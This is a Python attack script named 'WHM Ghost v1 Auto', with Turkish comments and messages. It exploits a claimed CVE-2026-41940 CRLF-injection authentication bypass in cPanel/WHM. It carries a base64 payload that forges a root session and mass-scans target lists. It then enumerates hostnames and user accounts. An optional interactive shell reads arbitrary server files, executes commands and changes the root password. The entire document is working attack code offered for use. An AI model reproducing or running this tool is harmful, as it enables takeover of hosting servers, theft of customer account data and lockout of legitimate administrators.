#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════╗
║          WHM GHOST v1 Auto – CVE-2026-41940 Auth Bypass             ║
║              Session CRLF Injection → Full Auto Pwn                 ║
║                     Developed by Arsenik                            ║
╚══════════════════════════════════════════════════════════════════════╝

Auto‑pilot mode: exploit → enumerate → report → optional shell.
Usage:
  python3 whm_ghost.py -u https://target.com:2087
  python3 whm_ghost.py -u https://target.com:2087 --shell
  python3 whm_ghost.py -l targets.txt -o results.json
  cat urls.txt | python3 whm_ghost.py
  subfinder -d target.com | httpx -p 2087 -silent | python3 whm_ghost.py
"""

import sys, os, re, json, ssl, signal, argparse, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import urlparse, quote, unquote, urlencode, urlsplit
import urllib.request, urllib.error

# ══════════════════════════════════════════════════════════════
#  RENKLER
# ══════════════════════════════════════════════════════════════
class C:
    R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
    B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
    W = "\033[97m"; BLD = "\033[1m"; DIM = "\033[2m"; RST = "\033[0m"
    O = "\033[38;5;208m"; NEON = "\033[38;5;51m"

LOG_LOCK = threading.Lock()
PRINT_LOCK = threading.Lock()

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(lvl, msg, target=""):
    ico = {
        "CRIT": f"{C.R}{C.BLD}[●]{C.RST}", "OK": f"{C.G}[✓]{C.RST}",
        "ERR": f"{C.R}[✗]{C.RST}", "INFO": f"{C.B}[ℹ]{C.RST}",
        "WARN": f"{C.Y}[⚠]{C.RST}", "PWN": f"{C.O}{C.BLD}[☠]{C.RST}",
    }.get(lvl, f"[{lvl}]")
    t = f" {C.DIM}{target}{C.RST}" if target else ""
    with LOG_LOCK:
        print(f"{C.DIM}{ts()}{C.RST} {ico} {msg}{t}", file=sys.stderr, flush=True)

def safe_print(msg):
    with PRINT_LOCK: print(msg, flush=True)

# Banner
BANNER = fr"""
{C.O}{C.BLD}
    ██╗    ██╗██╗  ██╗███╗   ███╗   ██████╗ ██╗  ██╗ ██████╗ ███████╗████████╗
    ██║    ██║██║  ██║████╗ ████║  ██╔════╝ ██║  ██║██╔═══██╗██╔════╝╚══██╔══╝
    ██║ █╗ ██║███████║██╔████╔██║  ██║  ███╗███████║██║   ██║███████╗   ██║
    ██║███╗██║██╔══██║██║╚██╔╝██║  ██║   ██║██╔══██║██║   ██║╚════██║   ██║
    ╚███╔███╔╝██║  ██║██║ ╚═╝ ██║  ╚██████╔╝██║  ██║╚██████╔╝███████║   ██║
     ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝     ╚═╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝   ╚═╝
{C.RST}
{C.NEON}{C.BLD}   ╔══════════════════════════════════════════════════════════╗
   ║         WHM GHOST v1 Auto – CVE-2026-41940 Full Auto         ║
   ║              Session CRLF Injection → Root Pwn               ║
   ║                    Developed by Arsenik                      ║
   ╚══════════════════════════════════════════════════════════════╝{C.RST}
"""

# Payload & sabitler
PAYLOAD_B64 = "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
PATCHED = {"110": ("11.110.0.97", 97), "118": ("11.118.0.63", 63),
           "126": ("11.126.0.54", 54), "132": ("11.132.0.29", 29),
           "134": ("11.134.0.20", 20), "136": ("11.136.0.5", 5)}
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0"

# SSL / HTTP motoru
class _SSL:
    ctx = None
    @classmethod
    def get(cls):
        if not cls.ctx:
            c = ssl.create_default_context()
            c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
            try: c.set_ciphers("DEFAULT:@SECLEVEL=1")
            except: pass
            cls.ctx = c
        return cls.ctx

class R:
    def __init__(self, s, b, h, u, ck=""):
        self.s=s; self.b=b; self.h=h; self.u=u; self.ck=ck
    def loc(self): return self.h.get("location","")
    def cookie(self, name):
        for line in self.ck.split("\n"):
            if line.lower().startswith(name.lower()+"="):
                return line.split("=",1)[1].split(";",1)[0].strip()
        return ""

class NoRedir(urllib.request.HTTPErrorProcessor):
    def http_response(self, req, r): return r
    https_response = http_response

def http(req_url, method="GET", headers=None, data=None, timeout=15,
         follow=False, canonical=None):
    if headers is None: headers = {}
    parsed = urlparse(req_url)
    hd = {"User-Agent": UA, "Accept": "*/*", "Connection": "close"}
    if canonical:
        p = parsed.port or (443 if parsed.scheme=="https" else 80)
        hd["Host"] = f"{canonical}:{p}" if p not in (80,443) else canonical
    hd.update(headers)
    bd = None
    if data:
        if isinstance(data, dict):
            bd = urlencode(data).encode()
            hd.setdefault("Content-Type", "application/x-www-form-urlencoded")
        else: bd = data.encode() if isinstance(data, str) else data
    opener = urllib.request.build_opener(
        urllib.request.HTTPSHandler(context=_SSL.get()),
        *([] if follow else [NoRedir()]))
    opener.addheaders = []
    try:
        req = urllib.request.Request(req_url, data=bd, headers=hd, method=method)
        with opener.open(req, timeout=timeout) as resp:
            b = resp.read().decode("utf-8", errors="replace")
            rh = {k.lower(): v for k, v in resp.headers.items()}
            ck = "\n".join(v for k, v in resp.headers.items() if k.lower()=="set-cookie")
            return R(resp.status, b, rh, resp.url, ck)
    except urllib.error.HTTPError as e:
        b = e.read().decode("utf-8", errors="replace") if e.fp else ""
        rh = {k.lower(): v for k, v in e.headers.items()} if hasattr(e,"headers") else {}
        ck = "\n".join(v for k, v in e.headers.items() if k.lower()=="set-cookie") if hasattr(e,"headers") else ""
        return R(e.code, b, rh, req_url, ck)
    except Exception as ex:
        return R(0, str(ex), {}, req_url, "")

# Hedef ayrıştırıcı
def parse(url):
    if "://" not in url: url = "https://"+url
    u = urlsplit(url.rstrip("/"))
    return u.scheme or "https", u.hostname, u.port or 2087

def burl(s, h, p, path):
    if (s=="https" and p==443) or (s=="http" and p==80):
        return f"{s}://{h}{path}"
    return f"{s}://{h}:{p}{path}"

# ══════════════════════════════════════════════════════════════
#  ANA EXPLOIT SINIFI (4 aşamalı)
# ══════════════════════════════════════════════════════════════
class GhostExploit:
    def __init__(self, scheme, host, port, timeout):
        self.s = scheme; self.h = host; self.p = port
        self.ch = None; self.sess = None; self.tok = None
        self.timeout = timeout

    def stage0(self):
        url = burl(self.s, self.h, self.p, "/openid_connect/cpanelid")
        r = http(url, timeout=self.timeout, follow=False)
        m = re.match(r"^https?://([^:/]+)", r.loc())
        self.ch = m.group(1) if m else self.h
        return self.ch

    def stage1(self):
        url = burl(self.s, self.h, self.p, "/login/?login_only=1")
        r = http(url, method="POST", data={"user":"root","pass":"wrong"},
                 canonical=self.ch, timeout=self.timeout)
        ck = r.cookie("whostmgrsession")
        if not ck: return None
        d = unquote(ck)
        self.sess = d.split(",",1)[0] if "," in d else d
        return self.sess

    def stage2(self):
        ce = quote(self.sess)
        url = burl(self.s, self.h, self.p, "/")
        r = http(url, headers={"Authorization": f"Basic {PAYLOAD_B64}",
                              "Cookie": f"whostmgrsession={ce}"},
                 canonical=self.ch, timeout=self.timeout)
        m = re.search(r"/cpsess(\d{10})", r.loc())
        if m:
            self.tok = f"/cpsess{m.group(1)}"
            return self.tok
        return None

    def stage3(self):
        ce = quote(self.sess)
        url = burl(self.s, self.h, self.p, "/scripts2/listaccts")
        http(url, headers={"Cookie": f"whostmgrsession={ce}"},
             canonical=self.ch, timeout=self.timeout)
        return True

    def stage4(self):
        ce = quote(self.sess)
        url = burl(self.s, self.h, self.p, f"{self.tok}/json-api/version")
        r = http(url, headers={"Cookie": f"whostmgrsession={ce}"},
                 canonical=self.ch, timeout=self.timeout)
        if r.s == 200 and '"version"' in r.b:
            v = re.search(r'"version"\s*:\s*"([^"]+)"', r.b).group(1)
            return {"confirmed": True, "version": v}
        if r.s in (500,503) and "License" in r.b:
            return {"confirmed": True, "version": "license-gated"}
        return {"confirmed": False}

    def run(self):
        self.ch = self.stage0()
        if not self.stage1():
            return False, "Preauth başarısız"
        if not self.stage2():
            return False, "CRLF enjeksiyonu başarısız"
        self.stage3()
        res = self.stage4()
        if res["confirmed"]:
            return True, res
        return False, "Doğrulama başarısız"

# ══════════════════════════════════════════════════════════════
#  OTOMATİK KEŞİF
# ══════════════════════════════════════════════════════════════
class AutoEnum:
    def __init__(self, ctx):
        self.ctx = ctx  # (s,h,p,ch,sess,tok,timeout)

    def api(self, func, params={}):
        s,h,p,ch,sess,tok,t = self.ctx
        ce = quote(sess)
        qs = "api.version=1&"+"&".join(f"{quote(k)}={quote(v)}" for k,v in params.items() if v is not None)
        url = burl(s, h, p, f"{tok}/json-api/{func}?{qs}")
        r = http(url, headers={"Cookie": f"whostmgrsession={ce}"},
                 canonical=ch, timeout=t)
        try: return json.loads(r.b)
        except: return r.b

    def gather(self):
        info = {}
        # Hostname
        r = self.api("gethostname")
        if isinstance(r, dict): info["hostname"] = r.get("data",{}).get("hostname","?")
        # Version
        r = self.api("version")
        if isinstance(r, dict): info["version"] = r.get("data",{}).get("version","?")
        # Accounts
        r = self.api("listaccts", {"search":"","searchtype":"user"})
        if isinstance(r, dict):
            accts = r.get("data",{}).get("acct",[])
            info["accounts"] = len(accts)
            info["users"] = [a.get("user","?") for a in accts[:30]]
        # Load & disk
        r = self.api("loadavg")
        if isinstance(r, dict): info["load"] = r.get("data",{}).get("one","?")
        r = self.api("getdiskinfo")
        if isinstance(r, dict):
            info["disk"] = {k: v for k,v in r.get("data",{}).items() if k in ["total","used","free"]}
        return info

# ══════════════════════════════════════════════════════════════
#  İNTERAKTİF SHELL (--shell için)
# ══════════════════════════════════════════════════════════════
def interactive_shell(ctx):
    s,h,p,ch,sess,tok,t = ctx
    disp = ch or f"{h}:{p}"
    prompt = f"{C.R}ghost{C.RST}@{C.C}{disp}{C.RST} {C.BLD}➤{C.RST} "
    safe_print(f"\n{C.O}{C.BLD}══ WHM Ghost Shell ══{C.RST}")
    while True:
        try:
            cmd = input(prompt).strip()
            if not cmd: continue
            if cmd in ("exit","quit"): break
            if cmd == "help":
                safe_print(f"{C.C}cat <path> | accounts | info | passwd <p> | exec <cmd> | exit{C.RST}")
            elif cmd.startswith("cat "):
                path = cmd[4:].strip()
                ce = quote(sess)
                for ep in [
                    f"{tok}/execute/Fileman/get_file_content?dir=%2F&file={quote(path)}",
                    f"{tok}/json-api/cpanel?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=viewfile&dir=/&file={quote(path)}"
                ]:
                    url = burl(s,h,p,ep)
                    r = http(url, headers={"Cookie": f"whostmgrsession={ce}"}, timeout=t)
                    if r.s==200 and r.b and len(r.b)>10:
                        safe_print(f"{C.G}{r.b[:2000]}{C.RST}")
                        break
                else:
                    safe_print(f"{C.DIM}Okunamadı{C.RST}")
            elif cmd.startswith("exec "):
                cmd_str = cmd[5:].strip()
                ce = quote(sess)
                url = burl(s,h,p, f"{tok}/json-api/scripts/exec?api.version=1&command={quote(cmd_str)}")
                r = http(url, headers={"Cookie": f"whostmgrsession={ce}"}, timeout=t)
                if r.s==200:
                    try: print(json.loads(r.b).get("data",{}).get("output", r.b[:500]))
                    except: print(r.b[:500])
                else:
                    log("ERR","Komut çalıştırılamadı")
            elif cmd == "accounts":
                ce = quote(sess)
                url = burl(s,h,p, f"{tok}/json-api/listaccts?api.version=1")
                r = http(url, headers={"Cookie": f"whostmgrsession={ce}"}, timeout=t)
                try:
                    accts = json.loads(r.b).get("data",{}).get("acct",[])
                    for a in accts[:15]: safe_print(f"  {C.G}{a.get('user','?')}{C.RST} – {a.get('domain','?')}")
                except: safe_print(r.b[:500])
            elif cmd == "info":
                info = AutoEnum(ctx).gather()
                safe_print(json.dumps(info, indent=2, ensure_ascii=False)[:1500])
            elif cmd.startswith("passwd "):
                passw = cmd[7:].strip()
                ce = quote(sess)
                url = burl(s,h,p, f"{tok}/json-api/passwd?api.version=1&user=root&password={quote(passw)}")
                http(url, headers={"Cookie": f"whostmgrsession={ce}"}, timeout=t)
                log("OK","Root şifresi değiştirildi")
            else:
                # varsayılan komut çalıştır
                ce = quote(sess)
                url = burl(s,h,p, f"{tok}/json-api/scripts/exec?api.version=1&command={quote(cmd)}")
                r = http(url, headers={"Cookie": f"whostmgrsession={ce}"}, timeout=t)
                if r.s==200:
                    try: print(json.loads(r.b).get("data",{}).get("output", r.b[:500]))
                    except: print(r.b[:500])
        except (KeyboardInterrupt, EOFError):
            print(); break

# ══════════════════════════════════════════════════════════════
#  ANA FONKSİYON
# ══════════════════════════════════════════════════════════════
RESULTS = []
RESULT_LOCK = threading.Lock()

def process_target(url, timeout):
    s, h, p = parse(url)
    ex = GhostExploit(s, h, p, timeout)
    log("INFO", f"Taranıyor: {url}")
    success, data = ex.run()
    if success:
        log("PWN", f"BAŞARILI! Sürüm: {data.get('version','?')}", url)
        ctx = (s, h, p, ex.ch, ex.sess, ex.tok, timeout)
        # Otomatik keşif
        en = AutoEnum(ctx)
        info = en.gather()
        entry = {
            "target": url,
            "canonical": ex.ch,
            "version": data.get("version"),
            "token": ex.tok,
            "session": ex.sess,
            "enum": info,
            "timestamp": datetime.now().isoformat()
        }
        with RESULT_LOCK:
            RESULTS.append(entry)
        return entry
    else:
        log("ERR", f"Başarısız: {data}", url)
        return None

def print_summary():
    if not RESULTS:
        safe_print(f"\n{C.Y}Hiçbir hedef ele geçirilemedi.{C.RST}")
        return
    safe_print(f"\n{C.O}{C.BLD}═══ WHM GHOST SONUÇLARI ═══{C.RST}")
    for i, r in enumerate(RESULTS, 1):
        safe_print(f"{C.BLD}[{i}]{C.RST} {C.R}{r['target']}{C.RST}")
        safe_print(f"   Sürüm: {r['version']}  Hostname: {r['enum'].get('hostname','?')}")
        safe_print(f"   Hesaplar: {r['enum'].get('accounts',0)} adet")
        users = r['enum'].get('users',[])
        if users:
            safe_print(f"   Kullanıcılar: {', '.join(users[:10])}")
        safe_print(f"   API: {burl(*parse(r['target'])[:2], r['target'].split(':')[-1] if ':' in r['target'] else 2087, r['token']+'/json-api/version')}")
    safe_print("")

def main():
    print(BANNER)
    ap = argparse.ArgumentParser(description="WHM Ghost v1 Auto – Developed by Arsenik")
    ap.add_argument("-u", "--url", help="Tek hedef URL")
    ap.add_argument("-l", "--list", help="URL listesi dosyası")
    ap.add_argument("-t", "--threads", type=int, default=10, help="Paralel iş parçacığı (varsayılan:10)")
    ap.add_argument("--timeout", type=int, default=15, help="Zaman aşımı (saniye)")
    ap.add_argument("--shell", action="store_true", help="İlk başarılı hedefte interaktif shell aç")
    ap.add_argument("-o", "--output", help="JSON rapor dosyası")
    ap.add_argument("--no-color", action="store_true")
    args = ap.parse_args()

    if args.no_color:
        for attr in dir(C):
            if not attr.startswith("__"): setattr(C, attr, "")

    targets = []
    if args.url:
        targets.append(args.url)
    if args.list:
        with open(args.list) as f:
            targets += [l.strip() for l in f if l.strip()]
    if not sys.stdin.isatty():
        for line in sys.stdin:
            u = re.search(r"(https?://[a-zA-Z0-9._:/?&=%-]+)", line)
            if u: targets.append(u.group(1).rstrip("[].,"))
    if not targets:
        ap.print_help()
        sys.exit(1)

    # Çoklu hedef kontrolü
    if args.shell and len(targets) > 1:
        log("WARN","Shell modu yalnızca tek hedefle çalışır. İlk hedef kullanılacak.")
        targets = [targets[0]]

    # Tarama başlat
    if len(targets) == 1:
        result = process_target(targets[0], args.timeout)
        if result and args.shell:
            ctx = (parse(targets[0])[0], parse(targets[0])[1], parse(targets[0])[2],
                   result["canonical"], result["session"], result["token"], args.timeout)
            interactive_shell(ctx)
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as ex:
            futures = [ex.submit(process_target, t, args.timeout) for t in targets]
            for _ in as_completed(futures): pass

    print_summary()

    if args.output:
        with open(args.output, "w") as f:
            json.dump({"scanner": "WHM Ghost v1 Auto – Arsenik",
                       "timestamp": datetime.now().isoformat(),
                       "findings": RESULTS}, f, indent=2, ensure_ascii=False)
        log("OK", f"Rapor kaydedildi: {args.output}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(); sys.exit(0)
